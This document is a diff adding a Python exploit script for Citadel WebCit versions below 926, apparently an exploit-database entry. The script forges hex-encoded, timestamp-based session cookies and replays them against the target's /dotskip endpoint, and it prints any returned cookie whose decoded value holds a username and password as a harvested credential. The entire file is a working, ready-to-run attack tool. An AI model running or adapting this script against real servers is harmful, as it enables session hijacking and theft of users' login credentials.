@@ -1,0 +1,63 @@
+# Exploit Title: Citadel WebCit < 926 - Session Hijacking Exploit
+# Exploit Author: Simone Quatrini
+# Version: 926
+
+#!/usr/bin/env python3
+import argparse
+import requests
+import time
+import sys
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+parser = argparse.ArgumentParser(description="Webcit <= 926 Session Hijacking")
+parser.add_argument('--url', action='store', dest='url', required=True, help="Full URL and port e.g.: http://192.168.1.111:8080/")
+parser.add_argument('--verbose', '-v', action='store_true', required=False, help="Shows the full response")
+args = parser.parse_args()
+
+url = args.url
+verbose = args.verbose
+
+
+def check_endpoint(url):
+	headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
+	response = requests.get(url+'/dotskip?room=_BASEROOM_', headers=headers, verify=False)
+	if response.status_code == 200:
+		print("[+] WebCit is reachable\n")
+	else:
+		print("\n[-] WebCit response code: ", response.status_code)
+		sys.exit()
+		
+def harvesting(url, verbose):
+	#Current Timestamp
+	epoch_time = int(time.time())
+	#harvesting technique only search for user that logged-in within the last ~20 minutes.
+	#increase the search_back_in variable's number to search even backwards (it will require more time and requests)
+	#Also, make sure that you're using the same timezone of the server
+	search_back_in = 999
+	print("[/] Credential harvesting in progress...")
+	while search_back_in > 0:
+		payload = str(epoch_time-search_back_in)+'|||||'
+		payload_hex = payload.encode(encoding='utf_8').hex()
+		headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Cookie':'webcit='+payload_hex+''}
+		response = requests.get(url+'/dotskip?room=_BASEROOM_', headers=headers, verify=False)
+		try:
+			cookievalue = bytes.fromhex(response.cookies['webcit'])
+			cookievalue = cookievalue.decode(encoding='utf_8')
+			parts = cookievalue.split('|')
+			
+			if ((len(parts[1])) and (len(parts[2]))):
+				print("Credential found: ", cookievalue)
+			
+		except:
+			if(verbose):
+				print("[-] Invalid returned cookie value not valid, skipping")
+		search_back_in = search_back_in - 1
+	print("[+] Credential harvesting done.")
+	
+# Default actions if only '--url' is passed
+check_endpoint(url)
+harvesting(url, verbose)
